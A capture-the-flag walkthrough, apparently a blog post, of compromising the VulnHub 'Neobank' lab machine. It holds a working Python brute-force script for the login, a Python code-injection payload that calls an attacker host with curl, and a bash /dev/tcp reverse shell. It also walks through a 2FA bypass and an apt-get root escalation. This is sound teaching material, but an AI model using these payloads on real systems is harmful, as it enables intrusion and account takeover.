---
title: Neobank
date: 12-23-2024
excerpt: VulnHub
cover: ../uploads/cover_neobank.jpg
tags: Broken Authentication, 2FA Bypass, IDOR, Remote Code Execution, Privilege Escalation
---

Welcome to my writeup on the *Neobank* machine from VulnHub. In this walkthrough, I will document the entire exploitation process as if conducting a formal penetration test. The objective is to simulate a real-world assessment by identifying and leveraging vulnerabilities to gain root access on the target system. This includes a structured approach involving initial reconnaissance, enumeration, exploitation, and privilege escalation. All steps are outlined clearly, supported with relevant tools and commands used during the engagement. This writeup aims not only to showcase the methodology but also to reinforce key principles in offensive security.

## Reconnaissance

### Scanning for Open Ports with Nmap

We will begin the assessment by performing a network scan using **Nmap** to identify open ports and potential entry points on the target system.

`nmap -A -sC -p- T5 -oN nmap_result.log 192.168.191.78`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F655CdQHpGquIWTJCPqNy%252FScreenshot%2520%281304%29.png%3Falt%3Dmedia%26token%3D6ca96710-98e6-40c9-8286-54a6fb236d73&width=768&dpr=3&quality=100&sign=adaefef4&sv=2)

HTTP open in 5000

### Inspecting the Web Login Page

Next, we navigate to the HTTP service in a web browser to manually inspect the content served by the web server.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMfNFUnf0PjQZWHZvOhYD%252FScreenshot%2520%281305%29.png%3Falt%3Dmedia%26token%3De785fdf1-2879-4875-8062-a261c8460682&width=768&dpr=3&quality=100&sign=d9e4c5a2&sv=2)

We are redirected to a login page asking for email and a pin

## Enumeration

### Directory Enumeration with Gobuster

The next step involved performing directory enumeration using **Gobuster** to identify accessible subdirectories on the web server.

`gobuster dir -u http://192.168.191.78:5000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 40 -x html,php,txt -q`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8kOgqH6Taww7y9fCmylk%252FScreenshot%2520%281307%29.png%3Falt%3Dmedia%26token%3D48a8e6a1-0447-46ce-9361-7eedda8cf0a6&width=768&dpr=3&quality=100&sign=6d06587b&sv=2)

While scanning, a subdirectory name **/email\_list**

### Discovering the Email List

We then accessed the discovered subdirectory to analyze its contents. The following observations were made:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FecDkETHjlIaJtIjqKkIC%252FScreenshot%2520%281308%29.png%3Falt%3Dmedia%26token%3Dcf691c1f-e33d-4e1f-9eee-070276e42c86&width=768&dpr=3&quality=100&sign=b5666370&sv=2)

11 neobank emails

Given that the page displays a collection of email addresses and the previously discovered login page requires an email for authentication, it was reasonable to assume one of these could be valid credentials. Therefore, the email addresses were extracted and saved to a file named `neobank_emails.txt` for further use.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVJ00sCRSCCcrar8I8Rxp%252FScreenshot%2520%281309%29.png%3Falt%3Dmedia%26token%3D9d6a486b-ca85-4880-90d5-f382c22b250d&width=768&dpr=3&quality=100&sign=83906657&sv=2)

At this stage, it might seem logical to proceed with a brute-force attack using the collected email addresses. While this is a viable option, it's important to first analyze the behavior of the login page when invalid credentials are submitted. This may reveal useful information or unexpected responses that could aid in the next steps.

### Analyzing the Login Page's Authentication Behavior

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDUM46aF9puUkiAf5RKbR%252FScreenshot%2520%281312%29.png%3Falt%3Dmedia%26token%3Dcb77d74a-a754-408f-8b2a-3f11a5619b28&width=768&dpr=3&quality=100&sign=3574aa32&sv=2)

It is noteworthy that the authentication mechanism does not provide explicit feedback or distinguishable error messages upon submission of invalid credentials. This behavior results in uniform server responses regardless of the legitimacy of the input, effectively obfuscating authentication failure events. Consequently, automated credential brute-forcing tools such as Hydra are rendered ineffective, as these tools depend on differential server responses to ascertain the validity of login attempts. The absence of response variance prevents reliable identification of successful authentications, thereby negating the utility of brute-force methodologies in this context.

However, how can we perform brute forcing under these conditions? While traditional tools may be ineffective, it is still possible to carry out a brute-force attack by developing a custom approach tailored to the system's specific behavior.

## Exploitation

### Building a Custom PIN Wordlist

Before developing our brute-force script, it is necessary to generate an appropriate wordlist for potential PINs. Since we already possess a wordlist of email addresses, it is reasonable to assume that the PIN consists of up to six digits. To this end, we will extract numeric passwords of six digits or less from the `rockyou.txt` dataset, then sort and filter them accordingly to create a focused PIN wordlist.

To begin, I extracted all numeric values.

`cat /usr/share/wordlists/rockyou.txt | egrep "^[0-9]*[0-9]$" > pins.txt`

Next, I filtered the numeric values to include only those with six digits or fewer.

`cat pins.txt | grep -x '.\{6\}' | sponge pins.txt`

With the comprehensive PIN list generated, encompassing all values from 000000 to 999999, we proceeded to develop a custom brute-force script to systematically test these credentials against the target authentication mechanism.

### Writing a Custom Brute-Force Script

```python
import requests
import sys

# Target endpoint URL for the login form
TARGET_URL = "http://192.168.191.78:5000/login"

# File paths to the wordlists containing email addresses and PINs
EMAIL_LIST_PATH = "neobank_emails.txt"
PIN_LIST_PATH = "pins.txt"

def read_lines_from_file(path):
    """
    Reads lines from a file and strips whitespace.
    Returns a list of non-empty lines.
    Exits the program with an error message if the file can't be read.
    """
    try:
        with open(path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read from {path}: {e}")
        sys.exit(1)

def attempt_login(email, pin):
    """
    Attempts to authenticate to the target URL using the given email and PIN.
    Returns True if a valid credential is identified (based on status code and cookies).
    """
    session = requests.Session()
    payload = {
        "email": email,
        "pin": pin
    }

    try:
        # Send the POST request with the login form data
        response = session.post(TARGET_URL, data=payload)
        code = response.status_code

        # Log each attempt to track progress and responses
        print(f"[*] Attempting {email}:{pin} --> HTTP {code}")

        # Heuristic for successful login:
        # HTTP 200 OK and exactly one session cookie received
        if code == 200 and len(response.cookies) == 1:
            print(f"[+] VALID CREDENTIAL FOUND")
            print(f"    ├── Email       : {email}")
            print(f"    ├── PIN         : {pin}")
            print(f"    └── Status Code : {code}\n")
            return True

    except requests.RequestException as err:
        print(f"[!] Request failed for {email}:{pin} --> {err}")

    return False

def main():
    """
    Main execution logic:
    - Load wordlists for emails and PINs
    - Begin brute-force attempts across all combinations
    - Stop once a valid credential pair is discovered
    """
    emails = read_lines_from_file(EMAIL_LIST_PATH)
    pins = read_lines_from_file(PIN_LIST_PATH)
    
    print(f"[*] Loaded {len(emails)} email(s) and {len(pins)} PIN(s).")
    print(f"[*] Starting brute-force operation...\n")

    # Iterate through all email and PIN combinations
    for pin in pins:
        for email in emails:
            if attempt_login(email, pin):
                return  # Exit on first valid credential pair found

if __name__ == "__main__":
    main()
```

It's important to note that the brute-force process may be time-consuming due to the volume of PIN combinations being tested. Patience is required as the operation progresses through each credential pair systematically.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FABEQyRXZkcGhUQE3oF6p%252FScreenshot%2520%281316%29.png%3Falt%3Dmedia%26token%3D517a1c2c-c874-4fc6-bc67-47b493f561b5&width=768&dpr=3&quality=100&sign=35e6de1&sv=2)

After a significant amount of time, the valid credentials were eventually identified.

With both the email and corresponding PIN now obtained, we can proceed to authenticate to the target application.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUiSL2cQl1ddX9HDVCM0i%252FScreenshot%2520%281317%29.png%3Falt%3Dmedia%26token%3D8ee069a0-1304-4712-a4f4-c724d6c5c02e&width=768&dpr=3&quality=100&sign=5df152d1&sv=2)

### Locating the QR Code and Bypassing 2FA

Upon successful login, the application prompts for a second authentication factor—a time-based one-time password (TOTP). However, the challenge lies in locating the secret key or QR code required to configure it in an authenticator app.

I proceeded to enumerate accessible subdirectories and came across one named `/qr`

`gobuster dir -u http://192.168.191.78:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x html,php,txt -q`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fxxf5p2KG0OBPLwGDXOmp%252FScreenshot%2520%281318%29.png%3Falt%3Dmedia%26token%3D9298e09a-9a07-4fa2-ab8d-c99eb77324e6&width=768&dpr=3&quality=100&sign=252e7f85&sv=2)

Navigating to the `/qr` directory revealed a QR code, which is commonly used to set up TOTP-based 2FA in authenticator applications.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fb6Hhxa2yF9h9spAafTnb%252FScreenshot%2520%281319%29.png%3Falt%3Dmedia%26token%3Db68a0af3-a499-4cba-983d-fdfc2a86de8f&width=768&dpr=3&quality=100&sign=cb1730a2&sv=2)

After scanning the QR code using an authenticator app on my phone, it successfully generated a valid TOTP code.

Upon submitting the 6-digit TOTP code, the application redirected to the following page.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FNLNJbBmx3TLGGJUcxnbh%252FScreenshot%2520%281320%29.png%3Falt%3Dmedia%26token%3D53ad532e-8120-4489-a120-176e6b27ef22&width=768&dpr=3&quality=100&sign=2fd65c01&sv=2)

Looks like a banking system

### Discovering the Withdraw Parameter Vulnerability

Since it's a banking system that allows balance withdrawals, let's go ahead and try withdrawing.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fmy3OA8LQZeohkCb4keIa%252FScreenshot%2520%281322%29.png%3Falt%3Dmedia%26token%3D91d6c5a3-ec14-4370-a0ee-c6cb4d26138b&width=768&dpr=3&quality=100&sign=9a12045e&sv=2)

That's odd—why did it turn negative? Seems like there's a logic flaw here. Let's launch Burp Suite and dig deeper.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FsyFNM4zN2jnHodflaV3X%252FScreenshot%2520%281323%29.png%3Falt%3Dmedia%26token%3Db05b72b2-e47a-4d39-af7d-3f31506f4e1e&width=768&dpr=3&quality=100&sign=eb8cd5f5&sv=2)

While reviewing, I identified a URL parameter named `withdraw`, which appears to control the amount being withdrawn. To verify its functionality, I modified the parameter to `1` and observed that the application successfully processed the request and returned an appropriate response. This confirms that the `withdraw` parameter plays a direct role in the application's transaction logic. Given its behavior and lack of apparent validation, this parameter may potentially serve as an entry point for further exploitation—possibly leading to remote code execution (RCE) if improperly handled on the backend.

### Achieving Remote Code Execution

After trying different payloads, this one works:

`__import__('os').system('curl <attacker_ip>')`

All I did is to setup an http server in my attacker machine to see if that request will be sent to the server. and it is.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FWIXYK5VyVzXDXzw6EgZQ%252FScreenshot%2520%281329%29.png%3Falt%3Dmedia%26token%3D065ce9db-9111-4768-9ab5-30df05e9b53e&width=768&dpr=3&quality=100&sign=2f423c2a&sv=2)

### Gaining a Reverse Shell

At this stage, the goal is to establish a reverse shell connection to gain remote access to the target system. For this, I crafted a payload designed to initiate a reverse shell using bash:

`/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'`

The next step is to configure a listener on our machine using **ncat**.

`nc -lnvp 1234`

Once the payload is delivered to the server, it is expected to establish a shell connection back to us.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOCevaVK7Yf2ec5l4vTMj%252FScreenshot%2520%281330%29.png%3Falt%3Dmedia%26token%3D7ce5957d-a183-4672-ad07-65a1cd927c5c&width=768&dpr=3&quality=100&sign=c76c531e&sv=2)

Notice that the payload is URL-encoded

Here's our listener:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8RnPLw0aQapKYO8ufGds%252FScreenshot%2520%281331%29.png%3Falt%3Dmedia%26token%3D986bdd26-a0c9-4bc6-b610-8cf76b554565&width=768&dpr=3&quality=100&sign=25519e06&sv=2)

### Extracting Database Credentials

Within the `/var/www/html` directory, I located a file named `main.py`. Let's examine its contents.

It's important to note that the MariaDB username and password are hard-coded within the script. This indicates that the system utilizes a database management system (DBMS) to store user information, including the email addresses previously discovered. The next step is to attempt logging into the database using these credentials.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FTU6Z7X1dSKBz97oB3sOV%252FScreenshot%2520%281338%29.png%3Falt%3Dmedia%26token%3Da5e63d84-ca25-4f0b-9ad2-a6b55710ca79&width=768&dpr=3&quality=100&sign=e1a3bbec&sv=2)

Access to the database was successfully gained. Upon inspecting the available databases, I identified one named `bank`. Within this database, there are two distinct tables.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Flx0JpB2EuKB0D6ggtowp%252FScreenshot%2520%281340%29.png%3Falt%3Dmedia%26token%3D0d147a2b-4b34-40d2-a96e-3b4c2d7caa23&width=768&dpr=3&quality=100&sign=e9af6ea5&sv=2)

The`accounts`table contains the user records, including their email addresses and hashed PINs.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJsiSt2uk8UWqq0b7zpOJ%252FScreenshot%2520%281341%29.png%3Falt%3Dmedia%26token%3D1c159218-5924-449c-8089-12795e627773&width=768&dpr=3&quality=100&sign=1820b098&sv=2)

Within the `system` table, I found the plaintext password associated with the user named `banker`.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FWiO6ld1NLwcyOXIBaYMg%252FScreenshot%2520%281342%29.png%3Falt%3Dmedia%26token%3D4e30fc7e-0f33-4290-817c-cab5b4f4a2f1&width=768&dpr=3&quality=100&sign=5b6be7ef&sv=2)

### Escalating to User Banker

Now let's switch to user `banker` .

`su banker`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8fbcVK7Q8CNG3ByKPDEd%252FScreenshot%2520%281343%29.png%3Falt%3Dmedia%26token%3D960e7c98-b068-47a3-99be-b77ca040ca08&width=768&dpr=3&quality=100&sign=30760c04&sv=2)

At this point, we successfully compromised the user `banker` and obtained the user-level flag.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F08O23Ve5w6hhjITWulvt%252FScreenshot%2520%281344%29.png%3Falt%3Dmedia%26token%3Dc23f040f-0a42-440b-a5ab-778c492bfc85&width=768&dpr=3&quality=100&sign=c18c632&sv=2)

User flag!!!

## Privilege Escalation

### Enumerating Sudo Privileges

With initial access established, the next objective is to escalate privileges and gain root access. To begin the privilege escalation process, I examined which commands could be executed with elevated privileges by running `sudo -l`.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9wGdl6xZzEiuGnFZK0M7%252FScreenshot%2520%281347%29.png%3Falt%3Dmedia%26token%3Dc5410bc8-197c-4e75-9c06-41174cf1b528&width=768&dpr=3&quality=100&sign=8a69047a&sv=2)

It appears that the `apt-get` command can be executed with elevated privileges via `sudo`. This is significant because `apt-get` is a package management tool used on Debian-based systems (such as Ubuntu) to install, upgrade, and manage software packages. When misconfigured or unrestricted under `sudo`, it can be leveraged to escalate privileges—potentially allowing an attacker to gain root access through methods like installing packages with post-installation scripts.

### Abusing apt-get via GTFOBins

To explore potential ways to leverage `apt-get` for privilege escalation, I consulted GTFOBins—a well-known resource that documents how common Linux binaries can be exploited when misconfigured.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F1Nns8uxjyciRTnZwQVmP%252FScreenshot%2520%281348%29.png%3Falt%3Dmedia%26token%3D029b85d6-25f5-4337-8e5c-88e34ee8ec93&width=768&dpr=3&quality=100&sign=8a7ccfe5&sv=2)

The `apt-get changelog` command **downloads the changelog over HTTP or HTTPS and opens it using the default pager** (usually `less`, `more`, etc.). If that pager allows us to **run shell commands**, then we can escape to a shell **from inside the pager**.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FjkgVHxoFkHaQ4liKhqPi%252FScreenshot%2520%281352%29.png%3Falt%3Dmedia%26token%3D46886e29-5e57-4721-9a73-2009ed8fe3cb&width=768&dpr=3&quality=100&sign=28fe7b98&sv=2)

### Obtaining Root Access

At this point, it's evident that privilege escalation is possible. Executing the final command and pressing Enter should result in a root shell being spawned.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUYfXp1WgqfUAo9uxMOxD%252FScreenshot%2520%281353%29.png%3Falt%3Dmedia%26token%3D8a864e90-2220-4ab2-8310-712e16d4b932&width=768&dpr=3&quality=100&sign=c943e7ed&sv=2)

Root access has been successfully obtained—Neobank has been fully compromised.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fixc5MHuhhFOzJA4k837H%252FScreenshot%2520%281355%29.png%3Falt%3Dmedia%26token%3D75fce0ed-6de6-4566-98dc-f97733e77464&width=768&dpr=3&quality=100&sign=842625ff&sv=2)

Root flag

## Conclusion

This assessment successfully demonstrated a full compromise of the *Neobank* machine hosted on VulnHub. The engagement began with reconnaissance using `nmap`, followed by web enumeration that led to the discovery of exposed subdirectories and email data. By leveraging this information, a custom brute-force script was developed to bypass an intentionally vague login mechanism and identify valid credentials.

Subsequently, a time-based two-factor authentication (2FA) challenge was bypassed by locating and scanning a QR code linked to a TOTP generator. Post-authentication, parameter tampering was observed in the `withdraw` functionality, which ultimately provided a foothold for Remote Code Execution (RCE) via a crafted reverse shell payload.

Privilege escalation was achieved by identifying `apt-get` as an executable command with elevated privileges through `sudo`. Utilizing guidance from GTFOBins, the misconfiguration was exploited to gain root access.

The engagement successfully uncovered multiple security flaws across the attack chain—from information disclosure and weak authentication mechanisms to improper input handling and insecure privilege escalation paths—highlighting critical areas that need to be addressed in the application and system configuration to improve overall security posture.
